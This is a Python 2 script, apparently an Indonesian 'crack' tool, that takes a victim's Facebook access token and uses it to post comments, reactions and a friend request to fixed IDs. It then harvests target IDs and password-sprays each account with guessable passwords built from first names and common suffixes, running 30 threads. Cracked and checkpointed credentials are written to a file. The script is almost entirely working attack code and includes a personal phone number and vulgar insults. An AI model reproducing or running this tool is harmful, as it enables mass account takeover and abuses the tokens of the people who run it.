#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70')]
br.addheaders = [('User-Agent','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:TECH ABM
##### LOGO #####
logo = """ 
\033[1;97m░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗
\033[1;97m██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
\033[1;97m██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░
\033[1;97m██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░
\033[1;97m╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗
\033[1;97m░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[41;1m AKUN SERVER LUAR NEGRI \033[00;1m
                               
\033[1;96m ╔════════════════════════════════════════════╗
\033[1;96m \033[1;32mAUTHOR   : \033[1;32m  RANDY
\033[1;96m \033[1;32mWHATSAP  : \033[1;32m +62 831-3394-9147
\033[1;96m \033[1;32mWARNING  : \033[1;32m Gausah Recode Kontol
\033[1;96m ╚════════════════════════════════════════════╝"""

                   


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mOrang Sabar Di sayang Jamda... ✅\x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """
\033[1;97m░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗
\033[1;97m██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
\033[1;97m██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░
\033[1;97m██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░
\033[1;97m╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗
\033[1;97m░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[41;1m AKUN SERVER LUAR NEGRI \033[00;1m
			       
\033[1;96m ╔════════════════════════════════════════════╗
\033[1;96m \033[1;32mAUTHOR   : \033[1;32mRANDY
\033[1;96m \033[1;32mEHATSAP  : \033[1;32m+62 831-3394-9147
\033[1;96m \033[1;32mWARNING  : \033[1;32mGausah Recode Kontol
\033[1;96m ╚════════════════════════════════════════════╝"""

print
print
jalan("\033[0;95mUSERNAME : RANDY") 
jalan("\033[0;95mPASSWORD: GANTENG") 
print
print

CorrectUsername = "RANDY"
CorrectPassword = "GANTENG"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[0;96m{★} \x1b[0;93mSEBUTKAN UNSURNAME TOOLS INI TOD \x1b[0;96m︻氕言テ一一一 ")
    if (username == CorrectUsername):
    	password = raw_input("\033[0;96m{★} \x1b[0;93mPASSWORD TOOLS INI APA TOD \x1b[0;96m︻氕言テ一一一 ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "SALAH MEMEK"
    else:
        print "SALAH ANJG"

def login():
    os.system('clear')
    print logo
    print
    print
    jalan("\033[1;91mLOGIN VIA TOKENFB !!!")
    print 
    toket = raw_input('\x1b[0;39m[\x1b[0;39m?\x1b[0;39m] \x1b[0;39m︻氕言テ一一一 \x1b[0;39m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[0;39m[\x1b[0;39m\xe2\x9c\x93\x1b[0;39m]\x1b[0;39m Login Berhasil'
        bot_komen()
    except KeyError:
        print '\x1b[0;39m[\x1b[0;39m!\x1b[0;39m] \x1b[0;39mToken Salah !'
        time.sleep(1.7)
        login()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;39m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100024540287354'
    kom = 'Nice😘'
    reac = 'ANGRY'
    post = '946670209494313'
    post2 = '946670209494313'
    kom2 =  'Nice😘'

    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()






def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 
	print "\033[1;24m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
	print "\033[1;94m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print "\033[1;96m═════════════════════════════════════"
	print "\x1b[1;97m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Star"
	print "\x1b[1;97m[\x1b[1;92m0\x1b[1;96m]\x1b[1;93m Exit"
        print "\033[1;96m═════════════════════════════════════"
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m═════════════════════════════════════"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Hack From Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Hack From Any Public ID"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File (target)"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	print "\033[1;96m═════════════════════════════════════"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print
		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 
		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter Target link type👉(farilist.txt)\x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mTarget Not Found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;91mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m[✺] \033[1;94mStarting \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;91m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
	print 
	jalan("       \033[1;92mCP ACCOUNT OPEN AFTER 7 DAYS.." )	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
     
				print '\x1b[1;96m[\x1b[1;92mHack Successful \x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
   
					print '\x1b[1;96m[\x1b[1;93mAfter 7 days\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
       
						print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
        
							print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;12m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
        
								print '\x1b[1;96m[\x1b[1;92mHack Successful\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
        
									print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;12m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123456'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
       
										print '\x1b[1;96m[\x1b[1;92mHack Successful\x1b[1;96m]\x1b[1;58m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
        
											print '\x1b[1;96m[\x1b[1;93mAfter 7 days\x1b[1;96m]\x1b[1;58m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
        
												print '\x1b[1;96m[\x1b[1;20mHack Successful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
        
													print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Pakistan123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
        
														print '\x1b[1;96m[\x1b[1;20mHack Successful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
      
															print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
       
																print '\x1b[1;96m[\x1b[1;20mHack Successful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
        
																	print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\033[1;93mProcess Has Been Completed'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print  """
\033[1;96m ╔════════════════════════════════════════════╗
\033[1;96m \033[1;32mTEAM  : \033[1;32mMR KALIT09
\033[1;96m \033[1;32mGITHUB : \033[1;32mhttps://github.com/MRKALIT09
\033[1;96m \033[1;32mWARNING  : \033[1;32mI M NOT RESPONSIBLE FOR ANY MISS USE
\033[1;96m ╚════════════════════════════════════════════╝"""
  
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()
